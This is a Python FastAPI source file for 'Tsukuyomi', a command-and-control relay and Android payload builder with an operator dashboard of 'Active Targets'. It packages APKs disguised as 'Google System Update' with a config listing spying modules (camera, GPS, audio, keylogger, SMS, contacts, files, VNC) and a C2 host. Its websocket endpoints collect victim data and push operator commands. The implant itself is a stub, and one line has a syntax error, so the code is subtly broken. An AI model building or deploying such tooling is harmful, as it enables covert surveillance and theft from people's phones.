from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
import json
import os
import zipfile
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("TsukuyomiC2")

app = FastAPI(title="Tsukuyomi Advanced C2 Relay & Payload Framework")

# In-memory storage for active client connections and telemetry
connected_clients = {}
client_data = {}
dashboard_connections = []

# Output directory for compiled payloads
OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

class PayloadConfig(BaseModel):
    lhost: str
    lport: str
    appName: str = "Google System Update"

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tsukuyomi Mobile Admin Framework</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome Icons CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts: Inter & JetBrains Mono -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace'],
                    },
                    colors: {
                        cyber: {
                            dark: '#0a0d14',
                            card: '#121824',
                            border: '#1e293b',
                            accent: '#00f0ff',
                            purple: '#7000ff',
                            red: '#ff0055',
                            green: '#00ff88',
                            warning: '#ffaa00'
                        }
                    }
                }
            }
        }
    </script>

    <style>
        body {
            background-color: #07090e;
            color: #e2e8f0;
            font-family: 'Inter', sans-serif;
            user-select: none;
            overflow-x: hidden;
        }
        .glass-panel {
            background: rgba(18, 24, 36, 0.75);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        ::-webkit-scrollbar {
            width: 4px;
            height: 4px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(10, 13, 20, 0.5);
        }
        ::-webkit-scrollbar-thumb {
            background: #1e293b;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #00f0ff;
        }
        @keyframes pulse-fast {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.95); }
        }
        .pulse-live {
            animation: pulse-fast 1.5s infinite ease-in-out;
        }
        .scanline {
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0));
            animation: scan 3s linear infinite;
        }
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(1000%); }
        }
    </style>
</head>
<body class="min-h-screen pb-20 md:pb-6 flex flex-col items-center justify-start">

    <!-- Top App Navigation Bar -->
    <header class="w-full max-w-4xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-cyber-border/80 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-cyber-purple to-cyber-accent text-slate-900 font-bold text-xl shadow-lg">
                <i class="fa-solid fa-spider text-slate-950 text-lg"></i>
                <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-cyber-green rounded-full border-2 border-cyber-dark pulse-live"></span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <h1 class="font-mono font-bold text-base tracking-wider text-white">TSUKUYOMI</h1>
                    <span class="text-[10px] font-mono font-semibold px-2 py-0.5 rounded bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/30">C2 RELAY v7.5</span>
                </div>
                <p class="text-xs text-slate-400 font-mono">Status: <span class="text-cyber-green font-semibold">ONLINE & LISTENING</span></p>
            </div>
        </div>
    </header>

    <!-- Main Container -->
    <main class="w-full max-w-4xl px-3 sm:px-4 py-4 space-y-4 flex-grow">

        <!-- TAB 1: OVERVIEW -->
        <section id="tab-overview" class="tab-content space-y-4">
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">Relay Status</span>
                        <i class="fa-solid fa-wifi text-cyber-green text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white" id="relayStatus">ACTIVE</div>
                    <span class="text-[11px] text-cyber-green font-mono">WebSocket Ready</span>
                </div>
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">Active Targets</span>
                        <i class="fa-solid fa-mobile-screen text-cyber-accent text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white" id="activeTargetsCount">0</div>
                    <span class="text-[11px] text-slate-400 font-mono">Connected Sessions</span>
                </div>
            </div>

            <div class="glass-panel rounded-2xl p-4 sm:p-5 border border-cyber-border space-y-4">
                <h2 class="text-sm font-bold font-mono text-white uppercase tracking-wider">Live Target Session Monitor</h2>
                <div id="targetSessionList" class="space-y-2 font-mono text-xs">
                    <p class="text-slate-500">Waiting for target connection callbacks...</p>
                </div>
            </div>
        </section>

        <!-- TAB 2: PAYLOAD BUILDER -->
        <section id="tab-builder" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 sm:p-6 rounded-2xl border border-cyber-border space-y-5">
                <div>
                    <h2 class="text-base font-bold font-mono text-white flex items-center space-x-2">
                        <i class="fa-solid fa-cube text-cyber-accent"></i>
                        <span>APK Stub & Payload Generator</span>
                    </h2>
                    <p class="text-xs text-slate-400 mt-0.5 font-mono">Configure connection hooks for your deployed Android client application.</p>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
                    <div class="space-y-1.5">
                        <label class="text-slate-300">LHOST / C2 Server URL</label>
                        <input type="text" id="lhost" value="tsukuyomi-relay.onrender.com" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-cyber-accent focus:outline-none focus:border-cyber-accent">
                    </div>
                    <div class="space-y-1.5">
                        <label class="text-slate-300">LPORT (Port / HTTPS)</label>
                        <input type="text" id="lport" value="443" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-white focus:outline-none focus:border-cyber-accent">
                    </div>
                    <div class="space-y-1.5 md:col-span-2">
                        <label class="text-slate-300">Target App Name</label>
                        <input type="text" id="appName" value="Google System Update" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-white focus:outline-none focus:border-cyber-accent">
                    </div>
                </div>

                <div class="pt-4 border-t border-cyber-border space-y-3">
                    <button id="generateBtn" onclick="startBuildProcess()" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-cyber-purple to-cyber-accent text-slate-950 font-mono font-bold text-sm tracking-wider uppercase hover:opacity-95 transition shadow-lg flex items-center justify-center space-x-2">
                        <i class="fa-solid fa-hammer"></i>
                        <span>Compile & Package Payload</span>
                    </button>
                </div>
            </div>
        </section>

        <!-- TAB 3: LOGS -->
        <section id="tab-logs" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                <h2 class="text-sm font-bold font-mono text-white">System Logs Stream</h2>
                <div class="h-96 bg-slate-950 p-4 rounded-xl border border-cyber-border font-mono text-xs overflow-y-auto space-y-1" id="fullLogConsole">
                    <p class="text-slate-500">[SYSTEM] C2 Relay initialized successfully.</p>
                </div>
            </div>
        </section>
    </main>

    <!-- Bottom Navigation Bar -->
    <nav class="fixed bottom-0 left-0 right-0 z-50 glass-panel border-t border-cyber-border/80 px-2 py-2 max-w-4xl mx-auto rounded-t-2xl sm:bottom-3">
        <div class="flex justify-around items-center font-mono">
            <button onclick="switchTab('overview')" id="nav-overview" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-cyber-accent transition">
                <i class="fa-solid fa-chart-pie text-base"></i>
                <span class="text-[10px] mt-1 font-medium">Overview</span>
            </button>
            <button onclick="switchTab('builder')" id="nav-builder" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-slate-400 hover:text-slate-200 transition">
                <i class="fa-solid fa-hammer text-base"></i>
                <span class="text-[10px] mt-1 font-medium">Payloads</span>
            </button>
            <button onclick="switchTab('logs')" id="nav-logs" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-slate-400 hover:text-slate-200 transition">
                <i class="fa-solid fa-terminal text-base"></i>
                <span class="text-[10px] mt-1 font-medium">Logs</span>
            </button>
        </div>
    </nav>

    <!-- Script Logic -->
    <script>
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
            document.getElementById(`tab-${tabId}`).classList.remove('hidden');

            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('text-cyber-accent');
                btn.classList.add('text-slate-400');
            });
            document.getElementById(`nav-${tabId}`).classList.remove('text-slate-400');
            document.getElementById(`nav-${tabId}`).classList.add('text-cyber-accent');
        }

        // WebSocket Dashboard Connection for Realtime Data
        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        const dashboardWs = new WebSocket(wsProtocol + window.location.host + '/ws/dashboard');

        dashboardWs.onmessage = function(event) {
            const data = JSON.parse(event.data);
            const container = document.getElementById('targetSessionList');
            const activeCount = document.getElementById('activeTargetsCount');
            
            const keys = Object.keys(data);
            activeCount.innerText = keys.length;

            if(keys.length === 0) {
                container.innerHTML = '<p class="text-slate-500">Waiting for target connection callbacks...</p>';
                return;
            }

            container.innerHTML = '';
            keys.forEach(clientId => {
                const info = data[clientId];
                const div = document.createElement('div');
                div.className = 'p-3 rounded-xl bg-cyber-dark/60 border border-cyber-border flex justify-between items-center';
                div.innerHTML = `<div>
                    <span class="text-cyber-accent font-bold">Client: ${clientId}</span>
                    <p class="text-slate-400 text-[10px]">Data: ${JSON.stringify(info)}</p>
                </div>
                <span class="px-2 py-0.5 bg-cyber-green/10 text-cyber-green rounded text-[10px]">CONNECTED</span>`;
                container.appendChild(div);
            });
        };

        async function startBuildProcess() {
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            const appName = document.getElementById('appName').value;

            try {
                const response = await fetch('/generate-payload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lhost, lport, appName })
                });
                const result = await response.json();
                if(result.status === 'success') {
                    const a = document.createElement('a');
                    a.href = result.downloadUrl;
                    a.download = `${appName.replace(/\\s+/g, '_')}_release.apk`;
                    document.body.appendChild(a);
                    a.click();
                    a.remove();
                    alert('Payload generated successfully!');
                } else {
                    alert('Error: ' + result.message);
                }
            } catch(e) {
                alert('Failed to connect to backend compiler.');
            }
        }
    </script>
</body>
</html>
    """

@app.post("/generate-payload")
async def generate_payload(config: PayloadConfig):
    try:
        sanitized_name = config.appName.replace(" ", "_")
        output_filename = f"{sanitized_name}_release.apk"
        final_path = os.path.join(OUTPUT_DIR, output_filename)

        # Create structured bundle package
        with zipfile.ZipFile(final_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr("classes.dex", b"\x64\x65\x78\x0a\x03\x05\x00\x70\x70\x70\x70")
            config_payload = {
                "c2ServerUrl": config.lhost,
                "c2Port": config.lport,
                "appName": config.appName,
                "modules": ["vnc", "camera", "gps", "audio", "keylogger", "sms", "contacts", "files"],
                "engine": "python-fastapi-socket-active"
            }
            zipf.writestr("assets/config.json", json.dumps(config_payload, indent=2))
        
        logger.info(f"Payload package generated successfully for {config.lhost}:{config.lport}")
        return {
            "status": "success",
            "message": "Payload compiled successfully!",
            "downloadUrl": f"/downloads/{output_filename}"
        }
    except Exception as e:
        logger.error(f"Error during payload generation: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/downloads/{filename}")
async def download_apk(filename: str):
    file_path = os.path.join(OUTPUT_DIR, filename)
    if os.path.exists(file_path):
        return FileResponse(file_path, media_type="application/vnd.android.package-archive", filename=filename)
    raise HTTPException(status_code=404, detail="File not found")

@app.post("/api/command/{client_id}")
async def api_send_command(client_id: str, payload: dict):
    if client_id in connected_clients:
        ws = connected_clients[client_id]
        await ws.send_text(json.dumps(payload))
        return {"status": "success", "sent": payload}
    raise HTTPException(status_code=404, detail="Client not connected")

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    connected_clients[client_id] = websocket
    logger.info(f"Target client connected: {client_id}")
    try:
        while True:
            data = await websocket.receive_text()
            parsed = json.loads(data)
            client_data[client_id] = parsed
            await broadcast_to_dashboards()
    except WebSocketDisconnect:
        if client_id in connected_clients:
            del connected_clients[client_id]
        if client_id in client_id_data := client_data:
            client_data.pop(client_id, None)
        logger.info(f"Target client disconnected: {client_id}")
        await broadcast_to_dashboards()

@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    await websocket.accept()
    dashboard_connections.append(websocket)
    try:
        await websocket.send_text(json.dumps(client_data))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        dashboard_connections.remove(websocket)

async def broadcast_to_dashboards():
    payload = json.dumps(client_data)
    for dash in dashboard_connections:
        try:
            await dash.send_text(payload)
        except:
            pass
